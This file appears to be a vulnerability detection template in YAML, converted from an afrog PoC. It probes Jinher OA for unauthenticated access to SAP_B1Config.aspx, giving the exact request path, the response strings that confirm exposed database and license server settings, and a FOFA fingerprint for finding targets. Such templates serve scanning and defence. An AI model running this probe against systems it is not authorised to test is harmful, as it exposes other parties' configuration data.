@@ -1,0 +1,27 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - txtLicenseServer
+          - txtDatabaseServer
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1'
+id: jinher-oa-sap-b1config-disclosure
+info:
+  author: zan8in
+  description: fofa app="金和网络-金和OA"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 金和OA SAP_B1Config.aspx未授权访问漏洞
+  severity: high
+  tags: jinher,oa,disclosure,argus-import
